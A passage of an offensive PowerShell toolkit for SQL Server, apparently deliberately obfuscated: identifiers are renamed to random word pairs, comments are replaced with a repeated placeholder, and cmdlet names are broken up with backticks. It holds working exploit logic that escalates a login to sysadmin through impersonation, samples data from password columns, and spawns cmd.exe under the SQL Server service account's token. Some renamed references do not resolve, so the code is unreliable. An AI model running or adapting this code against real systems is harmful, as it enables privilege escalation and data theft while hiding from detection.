                        $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                    }
                }
            }
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditPrivImpersonateLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal,
		
		[Parameter(Mandatory = $false,
        HelpMessage = 'Exploit Nested Impersonation Capabilites.')]
        [switch]$HoneyTrail
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Excessive Privilege - Impersonate Login'
        $EyesSmile   = 'The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.'
        $BeliefNote   = 'Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]'
        $ScorchEarth      = 'High'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = "Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -RotLethal"
        $GlowHorses       = ''
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms181362.aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $TenseCross = Get-SQLServerPriv -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.PermissionName -like 'IMPERSONATE'
        }

        # Microsoft".
        if($TenseCross)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : - Logins can be impersonated."
            $CurveUseful = 'Yes'

            # Microsoft".
            # Microsoft".
            # Microsoft".

            # Microsoft".
            $TenseCross |
            ForEach-Object -Process {
                # Microsoft".
                $LittleSharp = $_.ObjectName
                $PumpedNight = $_.GranteeName

                # Microsoft".
                $BeliefYear = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$LittleSharp') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                If($BeliefYear -eq 1)
                {
                    # Microsoft".
                    Write-Verbose -Message "$Instance : - $PumpedNight can impersonate the $LittleSharp sysadmin login."
                    $PourSkip = 'Yes'
                    $GlowHorses = "$PumpedNight can impersonate the $LittleSharp SYSADMIN login. This test was ran with the $JoyousLeft login."

                    # Microsoft".
                    # Microsoft".
                    # Microsoft".
                    if($RotLethal)
                    {
                        # Microsoft".
                        Write-Verbose -Message "$Instance : - EXPLOITING: Starting exploit process..."

                        # Microsoft".
                        $WickedSteel = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                        if($WickedSteel -ne 1)
                        {
                            # Microsoft".
                            Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($JoyousLeft) is NOT a sysadmin."
                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($JoyousLeft) to the sysadmin role by impersonating $LittleSharp..."

                            # Microsoft".
                            $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "EXECUTE AS LOGIN = '$LittleSharp';EXEC sp_addsrvrolemember '$JoyousLeft','sysadmin';Revert" -RaggedQuill

                            # Microsoft".
                            $JokeRude = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                            if($JokeRude -eq 1)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($JoyousLeft) a sysadmin!"
                                $PinPlease = 'Yes'
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($JoyousLeft) a sysadmin."
                            }
                        }
                        else
                        {
                            # Microsoft".
                            Write-Verbose -Message "$Instance : - EXPLOITING: The current login ($JoyousLeft) is already a sysadmin. No privilege escalation needed."
                            $PinPlease = 'No'
                        }
                    }
					# Microsoft".
                    # Microsoft".
                    # Microsoft".
                    if($HoneyTrail)
                    {
                        # Microsoft".
                        Write-Verbose -Message "$Instance : - EXPLOITING: Starting Nested Impersonation exploit process (under assumption to levels of nesting and 1st first can impersonate sa)..."

                        # Microsoft".
                        $WickedSteel = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                        if($WickedSteel -ne 1)
                        {
                            # Microsoft".
                            Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($JoyousLeft) is NOT a sysadmin."
                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($JoyousLeft) to the sysadmin role..."

                            # Microsoft".
                            $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "EXECUTE AS LOGIN = '$LittleSharp';EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$JoyousLeft','sysadmin'"

                            # Microsoft".
                            $JokeRude = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                            if($JokeRude -eq 1)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($JoyousLeft) a sysadmin!"
                                $PinPlease = 'Yes'
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($JoyousLeft) a sysadmin."
                            }
                        }
                        else
                        {
                            # Microsoft".
                            Write-Verbose -Message "$Instance : - EXPLOITING: The current login ($JoyousLeft) is already a sysadmin. No privilege escalation needed."
                            $PinPlease = 'No'
                        }
                    }
                }
                else
                {
                    # Microsoft".
                    Write-Verbose -Message "$Instance : - $PumpedNight can impersonate the $LittleSharp login (not a sysadmin)."
                    $GlowHorses = "$PumpedNight can impersonate the $LittleSharp login (not a sysadmin). This test was ran with the $JoyousLeft login."
                    $PourSkip = 'No'
                }

                # Microsoft".
                $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
            }
        }
        else
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : - No logins could be impersonated."
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditSampleDataByColumn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$EnjoySnake = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = ' Column name to search for.')]
        [string]$UnusedStew = 'Password'
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Potentially Sensitive Columns Found'
        $EyesSmile   = 'Columns were found in non default databases that may contain sensitive information.'
        $BeliefNote   = 'Ensure that all passwords and senstive data are masked, hashed, or encrypted.'
        $ScorchEarth      = 'Informational'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = "Invoke-SQLAuditSampleDataByColumn -Instance $Instance -RotLethal"
        $GlowHorses       = ''
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms188348.aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
        $DrearyFaulty = Get-SQLColumn -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -FileCellar $UnusedStew -EggsBead -RaggedQuill
        if($DrearyFaulty)
        {
            $CurveUseful  = 'Yes'
        }
        else
        {
            $CurveUseful  = 'No'
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($CurveUseful -eq 'Yes')
        {
            # Microsoft".
            $DrearyFaulty|
            ForEach-Object -Process {
                $AjarInnate = $_.DatabaseName
                $BrakeFlavor = $_.SchemaName
                $MuscleTeam = $_.TableName
                $SlowMagic = $_.ColumnName
                $RejectCover = "[$AjarInnate].[$BrakeFlavor].[$MuscleTeam].[$SlowMagic]"
                $MindJumpy = "[$AjarInnate].[$BrakeFlavor].[$MuscleTeam]"
                $BoringLarge = "USE $AjarInnate; SELECT TOP $EnjoySnake [$SlowMagic] FROM $MindJumpy "

                Write-Verbose -Message "$Instance : - Column match: $RejectCover"

                # Microsoft".
                # Microsoft".
                # Microsoft".
                # Microsoft".
                if($CurveUseful -eq 'Yes')
                {
                    $WanderFalse |
                    ForEach-Object -Process {
                        # Microsoft".
                        Write-Verbose -Message "$Instance : - EXPLOITING: Selecting data sample from column $RejectCover."

                        # Microsoft".
                        $AbaftMute = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge $BoringLarge -RaggedQuill |
                        ConvertTo-Csv -NoTypeInformation |
                        Select-Object -Skip 1
                        if($AbaftMute)
                        {
                            $GlowHorses = "Data sample from $RejectCover : $AbaftMute."
                        }
                        else
                        {
                            $GlowHorses = "No data found in affected column: $RejectCover."
                        }
                        $PourSkip = 'Yes'
                        $PinPlease = 'Yes'

                        # Microsoft".
                        $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                    }
                }
                else
                {
                    # Microsoft".
                    $GlowHorses = "Affected column: $RejectCover."
                    $PourSkip = 'Yes'
                    $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No columns were found that matched the search."
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLImpersonateServiceCmd
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Executable to run. Cmd.exe and Ssms.exe are recommended.')]
        [string]$MuscleSwing = 'cmd.exe',

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Only run commands in the context of SQL Server database engine service accounts.')]
        [switch]$AngleTown
    )

    Begin {
        
        # Microsoft".
        # Microsoft".
        Write-Verbose "Verifying local adminsitrator privileges..."
        $HotSour = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $SquareHouses = ne`w`-ob`je`ct -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($HotSour)
        $CurlySlow = [System.Security.Principal.WindowsBuiltInRole]::Administrator
        $JumpySoothe = $SquareHouses.IsInRole($CurlySlow)
        if($JumpySoothe){
             Write-Verbose "The current user has local administrator privileges."
        }else{
             Write-Verbose "The current user DOES NOT have local administrator privileges. Aborting."
             return
        }
    }

    Process {

        # Microsoft".
        Write-CrazyChief "Note: The verbose flag will give you more info if you need it."

        # Microsoft".
        Write-Verbose "Gathering list of SQL Server services running locally..."
        if($AngleTown){
            $BabyBuzz = Get-SQLServiceLocal -Instance $Instance -GradeGiant | Where-Object {$_.ServicePath -like "*sqlservr.exe*"}  | Sort-Object Instance
            Write-Verbose "Only the database engine service accounts will be targeted."
        }else{
            $BabyBuzz = Get-SQLServiceLocal -Instance $Instance -GradeGiant | Sort-Object Instance
        }

        # Microsoft".
        Write-Verbose "Gathering list of local processes..."
        $ListenSharpFour = Get-WmiObject -Class win32_process | Select-Object processid,ExecutablePath
        
        Write-Verbose "Targeting SQL Server processes..."        

        # Microsoft".
        $BabyBuzz |
        ForEach-Object {
            
            $WhiteSmell = $_.ServicePath.Split("`"")[1]
            $BasinBee = $_.ServiceDisplayName
            $AjarAwake = $_.ServiceAccount   
            $AllowAngle = $_.Instance  
                        
            # Microsoft".
            $ListenSharpFour | 
            ForEach-Object {
  
                $DogsDapper = $_.ExecutablePath
                $NiceUnable = $_.processid

                # Microsoft".
                if($WhiteSmell -like "$DogsDapper"){

                    Write-CrazyChief "$AllowAngle - Service: $BasinBee - Running command `"$MuscleSwing`" as $AjarAwake"

                    # Microsoft".
                    $StoryRange = "/C $MuscleSwing"

                    # Microsoft".
                    Invoke-TokenManipulation -AwakeSwing 'cmd.exe' -ProcessArgs $StoryRange -ProcessId $NiceUnable -ErrorAction SilentlyContinue

                    # Microsoft".
                }
            }               
        }               
    }

    End {
    
        # Microsoft".
        Write-CrazyChief "All done."
    }
}


# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Invoke-TokenManipulation
{

    [CmdletBinding(DefaultParameterSetName="Enumerate")]
    Param(
        [Parameter(ParameterSetName = "Enumerate")]
        [Switch]
        $BrawnyRhyme,

        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $BedAhead,

        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $FloodPack,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ClamAwake,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $AwakeSwing,

        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $CheerWall,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $AnimalWeary,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,

        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $QueueRare,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $PastSloppy,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $FutureCover,

        [Parameter(Mandatory = $false,ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance
    )
   
    Set-StrictMode -Version 2

	# Microsoft".
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $VoyageRigid = (ne`w`-ob`je`ct Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $PasteLearn = [Void]
	    )

	    $WorryPlane = [AppDomain]::CurrentDomain
	    $TouchFound = ne`w`-ob`je`ct System.Reflection.AssemblyName('ReflectedDelegate')
	    $BareSoup = $WorryPlane.DefineDynamicAssembly($TouchFound, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $YarnWool = $BareSoup.DefineDynamicModule('InMemoryModule', $false)
	    $PublicArt = $YarnWool.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $KneelRhythm = $PublicArt.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $VoyageRigid)
	    $KneelRhythm.SetImplementationFlags('Runtime, Managed')
	    $CheerSign = $PublicArt.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $PasteLearn, $VoyageRigid)
	    $CheerSign.SetImplementationFlags('Runtime, Managed')
	    
	    Write-CrazyChief $PublicArt.CreateType()
	}


	# Microsoft".
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $FaceHat,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $PaddleDecide
	    )

	    # Microsoft".
	    $MealDreary = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $GiantView = $MealDreary.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Microsoft".
	    $TiredTick = $GiantView.GetMethod('GetModuleHandle')
	    $OddYarn = $GiantView.GetMethod('GetProcAddress')
	    # Microsoft".
	    $HomelyUnable = $TiredTick.Invoke($null, @($FaceHat))
	    $GuitarStare = ne`w`-ob`je`ct IntPtr
	    $SmoggyCap = ne`w`-ob`je`ct System.Runtime.InteropServices.HandleRef($GuitarStare, $HomelyUnable)

	    # Microsoft".
	    Write-CrazyChief $OddYarn.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$SmoggyCap, $PaddleDecide))
	}

    # Microsoft".
    # Microsoft".
    # Microsoft".
    $CoatBall = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }

    $PriceyDeer = ne`w`-ob`je`ct PSObject -Property $CoatBall
    # Microsoft".


    # Microsoft".
    # Microsoft".
    # Microsoft".
	# Microsoft".
	# Microsoft".
	$WorryPlane = [AppDomain]::CurrentDomain
	$DreamCreepy = ne`w`-ob`je`ct System.Reflection.AssemblyName('DynamicAssembly')
	$BareSoup = $WorryPlane.DefineDynamicAssembly($DreamCreepy, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$YarnWool = $BareSoup.DefineDynamicModule('DynamicModule', $false)
	$WhineTray = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    # Microsoft".
	$PublicArt = $YarnWool.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
	$PublicArt.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
    $PublicArt.DefineLiteral('TokenGroups', [UInt32] 2) | Out-Null
    $PublicArt.DefineLiteral('TokenPrivileges', [UInt32] 3) | Out-Null
    $PublicArt.DefineLiteral('TokenOwner', [UInt32] 4) | Out-Null
    $PublicArt.DefineLiteral('TokenPrimaryGroup', [UInt32] 5) | Out-Null
    $PublicArt.DefineLiteral('TokenDefaultDacl', [UInt32] 6) | Out-Null
    $PublicArt.DefineLiteral('TokenSource', [UInt32] 7) | Out-Null
    $PublicArt.DefineLiteral('TokenType', [UInt32] 8) | Out-Null
    $PublicArt.DefineLiteral('TokenImpersonationLevel', [UInt32] 9) | Out-Null
    $PublicArt.DefineLiteral('TokenStatistics', [UInt32] 10) | Out-Null
    $PublicArt.DefineLiteral('TokenRestrictedSids', [UInt32] 11) | Out-Null
    $PublicArt.DefineLiteral('TokenSessionId', [UInt32] 12) | Out-Null
    $PublicArt.DefineLiteral('TokenGroupsAndPrivileges', [UInt32] 13) | Out-Null
    $PublicArt.DefineLiteral('TokenSessionReference', [UInt32] 14) | Out-Null
    $PublicArt.DefineLiteral('TokenSandBoxInert', [UInt32] 15) | Out-Null
    $PublicArt.DefineLiteral('TokenAuditPolicy', [UInt32] 16) | Out-Null
    $PublicArt.DefineLiteral('TokenOrigin', [UInt32] 17) | Out-Null
    $PublicArt.DefineLiteral('TokenElevationType', [UInt32] 18) | Out-Null
    $PublicArt.DefineLiteral('TokenLinkedToken', [UInt32] 19) | Out-Null
    $PublicArt.DefineLiteral('TokenElevation', [UInt32] 20) | Out-Null
    $PublicArt.DefineLiteral('TokenHasRestrictions', [UInt32] 21) | Out-Null
    $PublicArt.DefineLiteral('TokenAccessInformation', [UInt32] 22) | Out-Null
    $PublicArt.DefineLiteral('TokenVirtualizationAllowed', [UInt32] 23) | Out-Null
    $PublicArt.DefineLiteral('TokenVirtualizationEnabled', [UInt32] 24) | Out-Null
    $PublicArt.DefineLiteral('TokenIntegrityLevel', [UInt32] 25) | Out-Null
    $PublicArt.DefineLiteral('TokenUIAccess', [UInt32] 26) | Out-Null
    $PublicArt.DefineLiteral('TokenMandatoryPolicy', [UInt32] 27) | Out-Null
    $PublicArt.DefineLiteral('TokenLogonSid', [UInt32] 28) | Out-Null
    $PublicArt.DefineLiteral('TokenIsAppContainer', [UInt32] 29) | Out-Null
    $PublicArt.DefineLiteral('TokenCapabilities', [UInt32] 30) | Out-Null
    $PublicArt.DefineLiteral('TokenAppContainerSid', [UInt32] 31) | Out-Null
    $PublicArt.DefineLiteral('TokenAppContainerNumber', [UInt32] 32) | Out-Null
    $PublicArt.DefineLiteral('TokenUserClaimAttributes', [UInt32] 33) | Out-Null
    $PublicArt.DefineLiteral('TokenDeviceClaimAttributes', [UInt32] 34) | Out-Null
    $PublicArt.DefineLiteral('TokenRestrictedUserClaimAttributes', [UInt32] 35) | Out-Null
    $PublicArt.DefineLiteral('TokenRestrictedDeviceClaimAttributes', [UInt32] 36) | Out-Null
    $PublicArt.DefineLiteral('TokenDeviceGroups', [UInt32] 37) | Out-Null
    $PublicArt.DefineLiteral('TokenRestrictedDeviceGroups', [UInt32] 38) | Out-Null
    $PublicArt.DefineLiteral('TokenSecurityAttributes', [UInt32] 39) | Out-Null
    $PublicArt.DefineLiteral('TokenIsRestricted', [UInt32] 40) | Out-Null
